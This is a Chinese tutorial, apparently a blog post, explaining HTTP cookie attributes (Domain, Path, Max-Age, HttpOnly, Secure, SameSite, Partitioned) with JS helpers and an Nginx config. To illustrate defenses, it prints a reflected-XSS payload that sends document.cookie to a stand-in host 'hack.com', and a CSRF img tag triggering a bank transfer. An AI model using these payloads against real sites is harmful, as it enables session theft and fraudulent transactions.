> `Cookie`实际上是一小段的文本信息，它产生的原因是由于HTTP 协议是**无状态**的，所以需要通过 `Cookie` 来维持客户端与服务端之间的“会话状态”。如网络购物，能够在不同页面记录购物车信息，或者在网站不同页面共享登录状态。

Cookie的基本结构包括：名字、值、各种属性

### **属性**

一块cookie可能有Domain、Path、Expires、Max-Age、Secure、HttpOnly等多种属性，如

```jsx
**HTTP**/1.1 200 **OK**
Set-Cookie: token=abc; Domain=.baidu.com; Path=/accounts; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
```

### Domain和Path

`Domain`和`Path`属性定义了该cookie的可被访问的范围，告诉浏览器该cookie是属于哪一个网站的。在请求接口时，会根据`Domain`与`Path` 由浏览器决定是否要携带该`Cookie`。因此，`Domain`是有严格规范进行约束的，可以看成`Cookie`的第一道安全防线。

首先`Domain` 设置时在`格式上`必须以`.` 开头，且域必须还要包含一个`.`  ，或者是完全以`ip`的形式写入,

比如说：

`.baidu.com`  ✅

`192.168.3.5`  ✅

`.com` ❌

`.168.3.5` ❌ 非法ip地址是无法写入的

`www.baidu.com` ❓ 是否合法

> A Set-Cookie with Domain=ajax.com will be rejected because the  
> value for Domain does not begin with a dot.

虽然RFC中严格规定了`Domain` 必须以`.` 开头，但可能由于网站开发者经常忘记加上`.` ，所以浏览器都会自动的在前面加上一个 `.`

比如说下面这种：

写入时![](5375a3cf2d463b0db20d311b7f2a563e.png)![](618157c3718c04c5b509d39aad1ed308.png)

查看时

![](13b91ffe5acc7ac3cb47a279d93d7f88.png)

![](Cookies%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%20cd91476ff44d458fb79da39279ecd48c/Untitled%201.png)

如果服务器未指定cookie的`Domain`，则它们默认为所请求资源的域。

比如 网站地址为`www.baidu.com`  ，写入的Cookie响应头为`Set-Cookie: b=2; Domain=;` ，

则实际写入的Cookie为

![](98b6d417401dd37bcd957e1efde2bbc1.png)

我们可以看到 `b` 的`Domain`变成了当前网站的域，且前面也没有带上`.`

**区别**

- 当`Domain` 不带点时只有请求主机完全匹配时才会带上Cookie，也就是仅`www.baidu.com` 能访问
- 当`Domain` 带点时所有子域都能访问到该Cookie,如 `baidu.com` `b.baidu.com` `a.b.baidu.com`

**主机匹配**

如果请求主机与域名不匹配，则会被浏览器拒绝写入

当我在`www.a.com` 网站写入了一条`www.b.com` , 由于它们非同站会被浏览器拒绝写入

`Domain` 必须为当前域 或者 当前域的`父域`

- 请求主机为`www.baidu.com` ，写入域为 `.baidu.com`  `www.baidu.com` ✅
- 请求主机为`a.baidu.com` ，写入域为 `b.baidu.com` `c.a.baidu.com` ❌

再讲讲`Path` , `Path` 与`Domain` 相铺相成，`Domain`决定`Cookie`是否该被写入，而`Path` 决定具体请求哪个路径时会被携带。

例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/`
- `/docs/Web/`
- `/docs/Web/HTTP`

但是这些请求路径不会匹配以下地址：

- `/`
- `/docsets`
- `/fr/docs`

当为设置`Path`或者设置为空时，`Path` 会被设置为当前请求路径

![](207bf69d1d4e90f0f5e0ee98f86bc7ce.png)

注意点：

- 当请求地址不带末尾的`/` 时，`www.a.com:3000/a/b`  
  ![](Cookies%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%20cd91476ff44d458fb79da39279ecd48c/Untitled%205.png) ![](002fc185508179a2713f85c29c674f6b.png)
- 当请求地址末尾带`/` 时, `www.a.com:3000/a/b/`

![](a1a72cab614281f5080b8772c94b6a34.png)

Cookie是由`Domain` 与 `Path` 来区分的，因此不同的`Domain`或`Path` 会被识别成不同的Cookie, 所以你可能会遇到多个同名的情况

![](93b7d9e6701f2e6c47bcac6f379ef5d8.png)

这些Cookie会同时在请求头中被传递给服务器端

![](38d961dd4a0694336ad9ecc6fb185e1b.png)

我们可以看到 发送给服务器端的`Cookie`只会携带`Cookie`的键与名，不会携带相关的`Domain`信息，因此服务器端是无法判断出该`Cookie`具体是哪个域携带的。但会有携带顺序的优先级问题，参见 [https://blog.csdn.net/yy19900806/article/details/79190933](https://blog.csdn.net/yy19900806/article/details/79190933)

所以当我们有多个子网站需要使用相同名字的Cookie时，可以使用`不带点的全域名` 作为写入`Domain` 或者指定具体的不同`Path` , 或者采用前缀来区分不同网站

![](cf0cb5c0a426bae17e7be2e531208752.png)

![](Cookies%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%20cd91476ff44d458fb79da39279ecd48c/Untitled%209.png)

### **Expires和Max-Age**

`Expires` 与 `Max-Age`属性定义了Cookie的生命周期，也就是浏览器应删除cookie的时间。在默认情况下Cookie的生命周期是`Session`级别，即退出浏览器后自动过期。

与`Http Cache` 类似， `Expires` 是以一个绝对`GMT格式的时间`的来指定过期时间，而 `Max-Age` 是以多少秒后过期。`Max-Age` 是`http1.1` 的产物，优先级比`Expires` 要高，

- 当Max-Age 设置大于0时，则会在设置的多少秒后过期
- 当Max-Age 设置为0时，则会立即过期
- 当Max-Age 设置为-1时，为`Session`级别

区别点：

- `Expires` 是以`GMT`时间为单位，可能存在服务器与浏览器端时间不匹配的情况，导致不能精确控制时间到期时间。而`Max-Age` 则是以浏览器端接收到响应时开始计算时间的，以客户端为准
- `Max-Age` 使用与计算过期时间更简单，而`Expires` 兼容性更好

了解了这4个属性，我们就可以先封装自己的Cookie操作工具了，

浏览器提供的`document.cookie` 为我们提供了对`Cookie`的操作方式

- **增**  
  对`document.cookie` 重新赋值即可新增该`Cookie`, 而不是替换掉整个`Cookies` 。  
  注意：如果需要替换某个`Cookie`, 必须保证`Domain`与`Path`一致。其中Cookie内容只能包括Ascii码字符，所以需要经过一层编码。

```tsx
setCookie(
    name: string,
    value: string,
    days?: number,
    domainStr?: string
){
      let expires = '';
      if (days) {
          const date = new Date();
          date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
          expires = '; expires=' + date.toUTCString();
      }
      let domain = '';
      if (domainStr) {
          domain = '; domain=' + domainStr;
      }
      document.cookie = name + '=' + encodeURIComponent(value) + expires + domain + '; path=/';
  },
```

- **删**  
  只有将Cookie设为过期才会删除， 注意只有符合指定domain与path会被删除

```tsx
deleteCookie(name: string, domain?: string, path?: string) {
    const d = new Date(0);
    const domainTemp = domain ? `; domain=${domain}` : '';
    const pathTemp = path || '/';
    document.cookie =
        name + '=; expires=' + d.toUTCString() + domainTemp + '; path=' + pathTemp;
},
```

- **查**  
  我们仅能通过`document.cookie` 查询到所有的键与值，无法查询其具体的属性，每个不同的Cookie通过`;` 分割  
  ![](Cookies%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%20cd91476ff44d458fb79da39279ecd48c/Untitled%2010.png) ![](0f9a57b89451d4e9c06dcf0ca5cd37c2.png)

```tsx
function getCookie(cookieName) {
    const strCookie = document.cookie;
    const cookieList = strCookie.split("; ");

    for (let i = 0; i < cookieList.length; i++) {
        const arr = cookieList[i].split("=");
        if (cookieName === arr[0].trim()) {
            return decodeURIComponent(arr[1]);
        }
    }

    return "";
}
```

### **HttpOnly**

`HttpOnly`要求浏览器不要通过HTTP（和HTTPS）以外的渠道使用cookie，也就是说只能通过Http的响应头里进行`Set-Cookie` , 用户无法在js代码中去操作与读取该Cookie。这个属性主要是用来缓解XSS攻击的。

我们可以看下面两个例子

**反射型XSS窃取Cookie**

反射型XSS攻击指攻击者在页面中插入恶意Java Script脚本，该脚本随着HTTP/HTTPS请求数据一起发送给后端服务器，服务器对其进行响应，浏览器接收响应后将其解析渲染。恶意脚本的执行路径为“浏览器-服务器-浏览器”。浏览器中的恶意脚本发送到服务器，服务器直接对应资源返回浏览器中解析执行，整个过程类似于反射。

假设我们在百度上搜索内容，就会跳转以下页面。

`https://www.baidu.com/search?input=searchText`

之后返回的页面中会携带下面的内容

`<p>以下是搜索{searchText}的所有结果</p>`

这时我将`searchText` 改为如下的字符串

`<img src="notfound.png" onerror="location.href='http://hack.com/?cookie='+document.cookie'">`

接着我再把整个链接进行转码或者转短链接化，发送给用户，用户点击后在baidu上的cookie就会比自动发送到我们的hack服务器内。

**存储型XSS窃取Cookie**

存储型XSS攻击指攻击者在服务器的数据库中插入恶意Java Script脚本，当用户访问网站时，恶意脚本被发送到浏览器进行解析执行。

最经典的一个评论区案例

我在某网站的评论区直接输入一串JS代码

![](a608948e7c9cf0f5405f0b5e15fa673c.png)![](Cookies%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%20cd91476ff44d458fb79da39279ecd48c/Untitled%2011.png)

如果前端与后端均没有对其进行过滤，那么该评论被写入到数据库中，所有访问该页面的用户信息都会被窃取。

但目前XSS攻击并没有那么容易成功，大部分前端框架React, Vue，都会自动对HTML内容进行转义后再输出到页面，比如：

`<img src="empty.png" onerror ="alert('xss')">`

转义后输出到 html 中

`&lt;img src=&quot;empty.png&quot; onerror =&quot;alert(&#x27;xss&#x27;)&quot;&gt;`

相比之下，采用服务器端渲染的Web应用更容易被攻击，如`jsp`, `php`, `express-art-tempalte` 。

因此，采用`HttpOnly`来保护关键的用户`Cookie` 是能很大程度上防止`Cookie`被窃取，但并非完全杜绝。

### **Secure**

`Secure`属性是防止信息在传递的过程中被监听捕获造成信息泄漏。当`Secure`标志的值被设置为true时，表示创建的 `Cookie`会被以安全的形式向服务器传输，即只能在 `HTTPS`连接中被浏览器传递到服务器端进行会话验证，如果是 `HTTP`连接则不会传递该信息，所以`Cookie`的具体内容不会被盗取，该属性只能在`HTTPS`站点下被设置。

### SameSite

`Same Site` 直译过来就是同站，它和我们之前说的同域 `Same Origin` 是不同的。Cookie遵守`同站策略`，而非`同源策略`，两者的区别主要在于判断的标准是不一样的。一个 URL 主要有以下几个部分组成：

![](972e0fb382fba203b1018eb4b01627f2.svg)

可以看到同域的判断比较严格，需要 `protocol`, `hostname`, `port` 三部分完全一致。

相对而言，`Cookie`中的同站判断就比较宽松，主要是根据 Mozilla 维护的`公共后缀表`（[Pulic Suffix List](https://publicsuffix.org/list/public_suffix_list.dat)）使用有效顶级域名(eTLD)+1的规则查找得到的一级域名是否相同来判断是否是同站请求, 此外，`Cookie`并不区分`端口`与`协议`。

域名可以分成顶级域名（一级域名）、二级域名、三级域名等等，如：

顶级域名：`.com`, `.cn`, `.top`, `.xyz`

二级：`baidu.com`, `bilibili.com`

三级域名：`xx.baidu.com` `xx.bilibili.com`

这很好理解，如果是`github.io` 这属于什么域名？

例如 比较`https://tieba.baidu.com` 与 `https://wenku.baidu.com` 是否是同站。

根据上述的 `有效顶级域名(eTLD)+1的规则查找得到的一级域名是否相同`

`.com`是在 PSL 中记录的有效顶级域名，`eTLD+1` 后两者都是 `baidu.com` ,

所以 `https://tieba.baidu.com` 和 `https://www.baidu.com`是同站域名。

那我们再来比较下`jackWang.github.io` 与 `dtstack.github.io`

其中 `github.io`  我们再`PSL`中能够找到

![](96d9b7be151f92f6dc278085443aca6e.png)

因此`github.io` 是有效顶级域名`eTLD` ，`jackWang.github.io` 与 `dtstack.github.io` 分别是`eTLD+1` ， 它们不相等，所以是跨站的。由于`github.io` 是顶级域名，当`domain`设置为  `.github.io` 由于非法，并不会设置成功，也因此不同`github page`是不共享`Cookie`的。

**eTLD**

`eTLD` 的全称是 `effective Top-Level Domain`，它与我们往常理解的 `Top-Level Domain` 顶级域名有所区别。eTLD 记录在之前提到的 PSL 文件中。而 TLD(真正的顶级域名) 也有一个记录的列表，那就是 [Root Zone Database](https://www.iana.org/domains/root/db)。

eTLD 的出现主要是为了解决 `.com.cn`, `.com.hk`, `.co.jp` 这种看起来像是二级域名的但其实需要作为顶级域名存在的场景。

回到`SameSite`这个属性本身上，它有三个取值

- `None`
- `Lax`  默认值
- `Strict`

**None**

在chrome80版本以前，Same-Site的默认值是`None` , 该属性值表示不做任何限制，允许`第三方Cookie` 。啥是`第三方Cookie` ？根据上面同站的判断规则，如果是同站的，就称为`第一方` ，跨站的就为`第三方` 。

![](12da5b560897b03f88245b94df95334f.png)

那么什么时候我的网站会出现第三方`Cookie`，`Cookie Domain`不是只能设置自身域内吗 ?

首先`Set-Cookie`时的`Domain`校验是根据请求的主机，而不是当前导航栏URL的地址来判定的

![](ed2f062a35ae843645cbf40b5f9bea05.png)

当我请求一个`跨域请求`，或者通过`img标签`引入一个外域的图片时等等，如果请求响应设置了`Cookie`或者携带了`第三方Cookie`, 那么都会在`Devtools`中展示，只有当通过`document.cookie`访问时访问到的都为`第一方Cookie` 。

当我在`www.aliyun.com` 设置了如下Cookie:  `a=createFromAliyun; Domain=.aliyun.com;Path=/; SameSite=None`

当我访问`www.taobao.com`时， 里面引用了一张`aliyun.com`的图片

当我将SameSite设为None时，请求这张图片时才会带上我们在`www.aliyun.com` 下写入的Cookie `a` 。

![](16671221bc1908458ac4e2c5c7720a4d.png)

仅携带为`None`的`Cookie`

![](83c000336374c06108f52c756f9c7033.png)

**Lax**

`Lax`会对一部分`第三方Cookie`进行限制发送，我们知道互联网广告通过在固定域 Cookie 下标记用户 ID，记录用户的行为从何达到精准推荐的目的。随着全球隐私问题的整治，在 Chrome 80 中浏览器将默认的 SameSite 规则从 `SameSite=None` 修改为 `SameSite=Lax`。设置成 `SameSite=Lax` 之后页面内所有跨站情况下的资源请求都不会携带 Cookie。

具体规则：

| 类型      | 例子             | 是否发送 |
| --------- | ---------------- | -------- |
| a链接     |                  | 发送     |
| 预加载    |                  | 发送     |
| GET 表单  |                  | 发送     |
| POST 表单 |                  | 不发送   |
| iframe    |                  | 不发送   |
| AJAX      | axios.post fetch | 不发送   |
| 图片      | ![](...)         | 不发送   |

对用户来说这肯定是一件好事，避免了自身被攻击。但是对我们技术同学来说，这无疑是给我们设置的一个障碍。因为业务也确实会存在着多个域名的情况，并且需要在这些域名中进行 Cookie 传递。

这个修改影响面广泛，需要网站维护者花大量的时间去修改适配。

针对因为此次特性受到影响的网站，可以选择以下一些适配办法：

1. 降级浏览器版本至80以下；基本只能用作临时解决方案
2. 浏览器默认配置修改，91版本以下进入`chrome://flags`将`same-site-by-default-cookies`设为`disabled` , 94版本以下需改动启动项才行
3. 将站点都放到同一`二级域名`下面，即让他们保持`同站`  
   会使用两个不同的站点业务耦合，仅特定场景下可以考虑，比如通过iframe嵌入`单点登录页面` ，单点登录页面仅会在`iframe`中使用，没有人会单独去访问这个网站，则可以考虑修改单点登录页面的域名。
4. 为所有Cookie 增加 `SameSite=None;Secure` 属性  
   需要改动所有前后端设置Cookie的地方，改动量巨大，其次`None` 必须与`Secure` 配套使用，而`Secure` 意味着必须配备`HTTPS` 。
5. 通过Nginx反向代理我们的跨站网站， 使它们变成同站。  
   比如我在`www.baidu.com` 下通过iframe嵌套了`www.bilibili.com` , 它们跨站了，在bilibili中的`Set-Cookie` 将会被拒绝掉。  
   这时我在`Nginx`上开启一个代理服务，将域名 `bilibili.baidu.com` 代理转发至`www.bilibili.com`

`需要注意`： 要通过Nginx进行Cookie转发

```plain
server {
  listen       80;
  server_name  bilibili.baidu.com;

  location / {
    proxy_hide_header X-Frame-Options;
    # 用于cookie代理
    proxy_cookie_domain www.baidu.com  bilibili.baidu.com;
    # 代理到真实地址
    proxy_pass http://www.baidu.com;
  }
}
```

**Strict**

`Strict` 最为严格，它完全拒绝第三方站点，实际运用场景并不多，当某些Cookie被设为`Strict`后，可能会影响到用户的体验。比如我在`baidu.com` 中用`a标签` 链接到`bilibili` ，而`bilibili`的`token`如果是`Strict`的话，那我跳转过去就会丢失登录状态。

`SameSite` 的作用主要有两点:

一是进行隐私保护，

二是能够有效防御`CSRF攻击`

比如我在自己的黑客网站放入一张图片，里面的链接指向会将qiming的钱转给jialan， 诱导用户进入我的网站，由于第三方Cookie的存在，用户的登录态是存在的（之前登录过该银行的话），钱就会自动转入我的账户。如果设置了`Lax`或`Strict` , 则能避免这种问题。

`<img src="http://bank.example.com/withdraw?account=qiming&amount=1000000&for=jialan" />`

**Cookie大小与数量**

每一个Cookie的大小一般为4KB, 不同浏览器上不同，Chrome实测下来为`4096`个字节，其计算是`name` + `value`的字符串长度，当超过大小时设置不会成功

![](62bf7813f3f633fc791441bd138a6555.png)

实测下来每个域下面最多为175个，当超出最大限制时，会移除旧的Cookie

![](3ed80c8adcffa9fcd1f02918bf6c945f.png)

但我如何控制哪些Cookie在超出限制时不应该被删除？

cookie还有个 `Priority` 属性用来表示优先级

有以下取值：

- `Low`
- `Medium` 默认值
- `High`

那自动删除时将按下面顺序进行删除

1. 优先级为 `Low`的非 secure Cookie
2. 优先级为 `Low`的 secure Cookie
3. 优先级为 `Medium`的非 secure Cookie
4. 优先级为 `Medium`的 secure Cookie
5. 优先级为 `High`的非 secure Cookie
6. 优先级为 `High`的 secure Cookie

### 未来发展

Cookie在未来的很长一段时间都是不可或缺的，即使目前已经有了jwt等替代方案。 像国外的Cookie隐私法在一步步限制着Cookie的权利，访问站点时使用第三方Cookie都必须争得用户的同意。

![](f203277d4d46755c975be5394fae73e8.png)

未来的**SameParty**属性

`SameSite=Lax/Strict`  断了我们跨站传递 Cookie 的念想，但实际业务上确实有这种场景。然而Chrome是计划在2024年完全禁用`第三方Cookie` ，那完全禁用后，为了能够满足实际的业务需求，Chrome又推出了`SameParty`属性。

该提案提出了 `SameParty` 新的 Cookie 属性，当标记了这个属性的 Cookie 可以在同一个主域下进行共享。那如何定义不同的域名属于同一主域呢？主要是依赖了另外一个特性 [first-party-set](https://github.com/privacycg/first-party-sets) 第一方集合。它规定在每个域名下的该 URL `/.well-known/first-party-set` 可以返回一个第一方域名的配置文件。在这个文件中你可以定义当前域名从属于哪个第一方域名，该第一方域名下有哪些成员域名等配置。

```json
// https://a.example/.well-known/first-party-set
{
  "owner": "a.example",
  "members": ["b.example", "c.example"],
  ...
}

// https://b.example/.well-known/first-party-set
{
	"owner": "a.example"
}

// https://c.example/.well-known/first-party-set
{
	"owner": "a.example"
}
```

当然使用固定 URL 会产生额外的请求，对页面的响应造成影响。也可以直接使用 `Sec-First-Party-Set` 响应头直接指定归属的第一方域名。

该属性还未正式支持，此处只做简略说明，详细资料[https://developer.chrome.com/zh/docs/privacy-sandbox/first-party-sets/](https://developer.chrome.com/zh/docs/privacy-sandbox/first-party-sets/)

**Partitioned**属性

这个属性我们可能很少注意到，一般称为**Cookies Having Independent Partitioned State (CHIPS)**

![](f3d8bf953a70e7be446fe490e79da435.png)

它的作用是使`第三方Cookie`与`第一方站点` 相绑定

我们举个例子：

我在`https://site-a.example` 里，里面请求了 `https://3rd-party.example` 这个站点的资源， 而`https://3rd-party.example` 写入了一个`Cookie` ，那它属于`第三方COokie` 。

当我访问`https://site-b.example` 时，也请求了`https://3rd-party.example` 的资源，这时浏览器会把在`https://site-a.example` 中写入的第三方Cookie也给带上。

这是正常情况，原因是`Cookie`在会以写入它们的主机或者域名作为`Key`去存储，比如上面就是`[”https://3rd-party.example”]`,  我们并不知道它的创建上下文域名是啥。

当我开启`Partitioned` 时，Cookie存储时，还会记录创建它的上下文`eTLD + 1` 作为额外的`Partiotion Key` ， 变成`[”https://3rd-party.example”, "https://site-a.example"]` 。

当我访问`https://site-a.example`  是因为匹配上了`Partition Key` , 所以能够带上`第三方Cookie` , 访问`https://site-b.example` 时则不会带上`第三方Cookie` 。这样其实主要是限制了第三方Cookie的跟踪。

![](Cookies%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%20cd91476ff44d458fb79da39279ecd48c/Untitled%2021.png)

![](Cookies%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%20cd91476ff44d458fb79da39279ecd48c/Untitled%2022.png)

参考

[https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/](https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/)

[https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html](https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html)

[https://blog.csdn.net/frontend_nian/article/details/124221944](https://blog.csdn.net/frontend_nian/article/details/124221944)

[https://blog.csdn.net/weixin_40906515/article/details/120030218](https://blog.csdn.net/weixin_40906515/article/details/120030218)

[https://datatracker.ietf.org/doc/html/rfc6265#section-3.1](https://datatracker.ietf.org/doc/html/rfc6265#section-3.1)

[https://zhuanlan.zhihu.com/p/50541175](https://zhuanlan.zhihu.com/p/50541175)

[https://developer.mozilla.org/en-US/docs/Web/Privacy/Partitioned_cookies#cross-site_tracking_in_a_nutshell](https://developer.mozilla.org/en-US/docs/Web/Privacy/Partitioned_cookies#cross-site_tracking_in_a_nutshell)
